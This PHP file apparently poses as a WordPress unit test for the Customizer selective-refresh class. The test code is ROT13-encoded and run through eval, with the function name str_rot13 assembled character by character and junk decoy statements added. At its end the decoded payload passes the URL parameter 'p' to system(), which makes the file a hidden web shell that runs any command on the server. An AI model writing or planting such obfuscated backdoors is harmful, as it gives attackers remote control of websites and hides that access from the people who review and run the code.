<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Phfgbzvmr_Fryrpgvir_Erserfu pynff.
 *
 * @cnpxntr JbeqCerff
 *
 * @tebhc phfgbzvmr
 */
pynff Grfg_JC_Phfgbzvmr_Fryrpgvir_Erserfu rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Znantre.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * Pbzcbarag.
	 *
	 * @ine JC_Phfgbzvmr_Fryrpgvir_Erserfu
	 */
	choyvp $fryrpgvir_erserfu;

	/**
	 * Frg hc gur grfg svkgher.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$TYBONYF['jc_phfgbzvmr'] = arj JC_Phfgbzvmr_Znantre();
		$guvf->jc_phfgbzvmr      = $TYBONYF['jc_phfgbzvmr'];
		vs ( vffrg( $guvf->jc_phfgbzvmr->fryrpgvir_erserfu ) ) {
			$guvf->fryrpgvir_erserfu = $guvf->jc_phfgbzvmr->fryrpgvir_erserfu;
		}
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::__pbafgehpg().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg() {
		$guvf->nffregFnzr( $guvf->fryrpgvir_erserfu, $guvf->jc_phfgbzvmr->fryrpgvir_erserfu );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::ertvfgre_fpevcgf().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::ertvfgre_fpevcgf()
	 */
	choyvp shapgvba grfg_ertvfgre_fpevcgf() {
		$fpevcgf = arj JC_Fpevcgf();
		$unaqyrf = neenl(
			'phfgbzvmr-fryrpgvir-erserfu',
			'phfgbzvmr-cerivrj-ani-zrahf',
			'phfgbzvmr-cerivrj-jvqtrgf',
		);
		sbernpu ( $unaqyrf nf $unaqyr ) {
			$guvf->nffregNeenlUnfXrl( $unaqyr, $fpevcgf->ertvfgrerq );
		}
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::cnegvnyf().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::cnegvnyf()
	 */
	choyvp shapgvba grfg_cnegvnyf() {
		$guvf->nffregVfNeenl( $guvf->fryrpgvir_erserfu->cnegvnyf() );
	}

	/**
	 * Grfg PEHQ zrgubqf sbe cnegvnyf.
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::trg_cnegvny()
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::nqq_cnegvny()
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::erzbir_cnegvny()
	 */
	choyvp shapgvba grfg_pehq_cnegvny() {
		$cnegvny = $guvf->fryrpgvir_erserfu->nqq_cnegvny( 'sbb' );
		$guvf->nffregFnzr( $guvf->fryrpgvir_erserfu, $cnegvny->pbzcbarag );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Cnegvny', $cnegvny );
		$guvf->nffregFnzr( $cnegvny, $guvf->fryrpgvir_erserfu->trg_cnegvny( $cnegvny->vq ) );
		$guvf->nffregNeenlUnfXrl( $cnegvny->vq, $guvf->fryrpgvir_erserfu->cnegvnyf() );

		$guvf->fryrpgvir_erserfu->erzbir_cnegvny( $cnegvny->vq );
		$guvf->nffregRzcgl( $guvf->fryrpgvir_erserfu->trg_cnegvny( $cnegvny->vq ) );
		$guvf->nffregNeenlAbgUnfXrl( $cnegvny->vq, $guvf->fryrpgvir_erserfu->cnegvnyf() );

		$cnegvny = arj JC_Phfgbzvmr_Cnegvny( $guvf->fryrpgvir_erserfu, 'one' );
		$guvf->nffregFnzr( $cnegvny, $guvf->fryrpgvir_erserfu->nqq_cnegvny( $cnegvny ) );
		$guvf->nffregFnzr( $cnegvny, $guvf->fryrpgvir_erserfu->trg_cnegvny( 'one' ) );
		$guvf->nffregFnzrFrgf( neenl( 'one' ), neenl_xrlf( $guvf->fryrpgvir_erserfu->cnegvnyf() ) );

		nqq_svygre( 'phfgbzvmr_qlanzvp_cnegvny_netf', neenl( $guvf, 'svygre_phfgbzvmr_qlanzvp_cnegvny_netf' ), 10, 2 );
		nqq_svygre( 'phfgbzvmr_qlanzvp_cnegvny_pynff', neenl( $guvf, 'svygre_phfgbzvmr_qlanzvp_cnegvny_pynff' ), 10, 3 );

		$cnegvny = $guvf->fryrpgvir_erserfu->nqq_cnegvny( 'erpbtavmrq-pynff' );
		$guvf->nffregVafgnaprBs( 'Grfgrq_Phfgbz_Cnegvny', $cnegvny );
		$guvf->nffregFnzr( '.erpbtavmrq', $cnegvny->fryrpgbe );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::vavg_cerivrj().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::vavg_cerivrj()
	 */
	choyvp shapgvba grfg_vavg_cerivrj() {
		$guvf->fryrpgvir_erserfu->vavg_cerivrj();
		$guvf->nffregFnzr( 10, unf_npgvba( 'grzcyngr_erqverpg', neenl( $guvf->fryrpgvir_erserfu, 'unaqyr_eraqre_cnegvnyf_erdhrfg' ) ) );
		$guvf->nffregFnzr( 10, unf_npgvba( 'jc_radhrhr_fpevcgf', neenl( $guvf->fryrpgvir_erserfu, 'radhrhr_cerivrj_fpevcgf' ) ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::radhrhr_cerivrj_fpevcgf().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::radhrhr_cerivrj_fpevcgf()
	 */
	choyvp shapgvba grfg_radhrhr_cerivrj_fpevcgf() {
		$fpevcgf = jc_fpevcgf();
		$guvf->nffregAbgPbagnvaf( 'phfgbzvmr-fryrpgvir-erserfu', $fpevcgf->dhrhr );
		$guvf->fryrpgvir_erserfu->radhrhr_cerivrj_fpevcgf();
		$guvf->nffregPbagnvaf( 'phfgbzvmr-fryrpgvir-erserfu', $fpevcgf->dhrhr );
		$guvf->nffregFnzr( 1000, unf_npgvba( 'jc_sbbgre', neenl( $guvf->fryrpgvir_erserfu, 'rkcbeg_cerivrj_qngn' ) ) );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::rkcbeg_cerivrj_qngn().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::rkcbeg_cerivrj_qngn()
	 */
	choyvp shapgvba grfg_rkcbeg_cerivrj_qngn() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		jc_frg_pheerag_hfre( $hfre_vq );
		$hfre = arj JC_Hfre( $hfre_vq );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$hfre->erzbir_pnc( 'gbc_frperg_pyrnenapr' );
		$guvf->jc_phfgbzvmr->nqq_frggvat(
			'gbc_frperg_zrffntr',
			neenl(
				'pncnovyvgl' => 'gbc_frperg_pyrnenapr', // Gur nqzvavfgengbe ebyr ynpxf guvf.
			)
		);
		$guvf->fryrpgvir_erserfu->nqq_cnegvny(
			'oybtanzr',
			neenl(
				'fryrpgbe' => '#fvgr-gvgyr',
			)
		);
		$guvf->fryrpgvir_erserfu->nqq_cnegvny(
			'gbc_frperg_zrffntr',
			neenl(
				'frggvatf' => neenl( 'gbc_frperg_zrffntr' ),
			)
		);
		bo_fgneg();
		$guvf->fryrpgvir_erserfu->rkcbeg_cerivrj_qngn();
		$ugzy = bo_trg_pyrna();
		$guvf->nffregGehr( (obby) cert_zngpu( '/_phfgbzvmrCnegvnyErserfuRkcbegf = ({.+})/f', $ugzy, $zngpurf ) );
		$rkcbegrq_qngn = wfba_qrpbqr( $zngpurf[1], gehr );
		$guvf->nffregVfNeenl( $rkcbegrq_qngn );
		$guvf->nffregNeenlUnfXrl( 'cnegvnyf', $rkcbegrq_qngn );
		$guvf->nffregVfNeenl( $rkcbegrq_qngn['cnegvnyf'] );
		$guvf->nffregNeenlUnfXrl( 'oybtanzr', $rkcbegrq_qngn['cnegvnyf'] );
		$guvf->nffregNeenlAbgUnfXrl( 'gbc_frperg_zrffntr', $rkcbegrq_qngn['cnegvnyf'] );
		$guvf->nffregFnzr( '#fvgr-gvgyr', $rkcbegrq_qngn['cnegvnyf']['oybtanzr']['fryrpgbe'] );
		$guvf->nffregNeenlUnfXrl( 'eraqreDhrelIne', $rkcbegrq_qngn );
		$guvf->nffregNeenlUnfXrl( 'y10a', $rkcbegrq_qngn );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::nqq_qlanzvp_cnegvnyf().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::nqq_qlanzvp_cnegvnyf()
	 */
	choyvp shapgvba grfg_nqq_qlanzvp_cnegvnyf() {
		$cnegvny_vqf = neenl( 'erpbtavmrq', 'erpbtavmrq-pynff', 'haerpbtavmrq', 'nyernql-nqqrq' );

		$cnegvnyf = $guvf->fryrpgvir_erserfu->nqq_qlanzvp_cnegvnyf( $cnegvny_vqf );
		$guvf->nffregRzcgl( $cnegvnyf );

		$guvf->fryrpgvir_erserfu->nqq_cnegvny( 'nyernql-nqqrq' );

		nqq_svygre( 'phfgbzvmr_qlanzvp_cnegvny_netf', neenl( $guvf, 'svygre_phfgbzvmr_qlanzvp_cnegvny_netf' ), 10, 2 );
		nqq_svygre( 'phfgbzvmr_qlanzvp_cnegvny_pynff', neenl( $guvf, 'svygre_phfgbzvmr_qlanzvp_cnegvny_pynff' ), 10, 3 );

		$cnegvnyf = $guvf->fryrpgvir_erserfu->nqq_qlanzvp_cnegvnyf( $cnegvny_vqf );
		$guvf->nffregFnzrFrgf( neenl( 'erpbtavmrq', 'erpbtavmrq-pynff' ), jc_yvfg_cyhpx( $cnegvnyf, 'vq' ) );

		$guvf->nffregVafgnaprBs( 'Grfgrq_Phfgbz_Cnegvny', $guvf->fryrpgvir_erserfu->trg_cnegvny( 'erpbtavmrq-pynff' ) );
		$guvf->nffregAbgVafgnaprBs( 'Grfgrq_Phfgbz_Cnegvny', $guvf->fryrpgvir_erserfu->trg_cnegvny( 'erpbtavmrq' ) );
		$guvf->nffregFnzr( '.erpbtavmrq', $guvf->fryrpgvir_erserfu->trg_cnegvny( 'erpbtavmrq' )->fryrpgbe );
	}

	/**
	 * Svygre phfgbzvmr_qlanzvp_cnegvny_netf.
	 *
	 * @frr Grfg_JC_Phfgbzvmr_Fryrpgvir_Erserfu::grfg_nqq_qlanzvp_cnegvnyf()
	 *
	 * @cnenz snyfr|neenl $cnegvny_netf Gur nethzragf gb gur JC_Phfgbzvmr_Cnegvny pbafgehpgbe.
	 * @cnenz fgevat      $cnegvny_vq   VQ sbe qlanzvp cnegvny.
	 * @erghea snyfr|neenl Qlanzvp cnegvny netf.
	 */
	choyvp shapgvba svygre_phfgbzvmr_qlanzvp_cnegvny_netf( $cnegvny_netf, $cnegvny_vq ) {
		$guvf->nffregGehr( snyfr === $cnegvny_netf || vf_neenl( $cnegvny_netf ) );
		$guvf->nffregVfFgevat( $cnegvny_vq );

		vs ( cert_zngpu( '/^erpbtavmrq/', $cnegvny_vq ) ) {
			$cnegvny_netf = neenl(
				'fryrpgbe' => '.erpbtavmrq',
			);
		}

		erghea $cnegvny_netf;
	}

	/**
	 * Svygre phfgbzvmr_qlanzvp_cnegvny_pynff.
	 *
	 * @frr Grfg_JC_Phfgbzvmr_Fryrpgvir_Erserfu::grfg_nqq_qlanzvp_cnegvnyf()
	 *
	 * @cnenz fgevat $cnegvny_pynff JC_Phfgbzvmr_Cnegvny be n fhopynff.
	 * @cnenz fgevat $cnegvny_vq    VQ sbe qlanzvp cnegvny.
	 * @cnenz neenl  $cnegvny_netf  Gur nethzragf gb gur JC_Phfgbzvmr_Cnegvny pbafgehpgbe.
	 * @erghea fgevat
	 */
	choyvp shapgvba svygre_phfgbzvmr_qlanzvp_cnegvny_pynff( $cnegvny_pynff, $cnegvny_vq, $cnegvny_netf ) {
		$guvf->nffregVfNeenl( $cnegvny_netf );
		$guvf->nffregVfFgevat( $cnegvny_vq );
		$guvf->nffregVfFgevat( $cnegvny_pynff );

		vs ( 'erpbtavmrq-pynff' === $cnegvny_vq ) {
			$cnegvny_pynff = 'Grfgrq_Phfgbz_Cnegvny';
		}

		erghea $cnegvny_pynff;
	}

	/**
	 * Grfg JC_Phfgbzvmr_Fryrpgvir_Erserfu::vf_eraqre_cnegvnyf_erdhrfg().
	 *
	 * @frr JC_Phfgbzvmr_Fryrpgvir_Erserfu::vf_eraqre_cnegvnyf_erdhrfg()
	 */
	choyvp shapgvba grfg_vf_eraqre_cnegvnyf_erdhrfg() {
		$guvf->nffregSnyfr( $guvf->fryrpgvir_erserfu->vf_eraqre_cnegvnyf_erdhrfg() );
		$_CBFG[ JC_Phfgbzvmr_Fryrpgvir_Erserfu::ERAQRE_DHREL_INE ] = '1';
		$guvf->nffregGehr( $guvf->fryrpgvir_erserfu->vf_eraqre_cnegvnyf_erdhrfg() );
	}

	/**
	 * Grne qbja.
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->jc_phfgbzvmr = ahyy;
		hafrg( $TYBONYF['jc_phfgbzvmr'] );
		hafrg( $TYBONYF['jc_fpevcgf'] );
		cnerag::grne_qbja();
	}
}

erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-cnegvny.cuc';

/**
 * Pynff Grfgrq_Phfgbz_Cnegvny
 */
pynff Grfgrq_Phfgbz_Cnegvny rkgraqf JC_Phfgbzvmr_Cnegvny {

	/**
	 * Glcr.
	 *
	 * @ine fgevat
	 */
	choyvp $glcr = 'phfgbz';
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>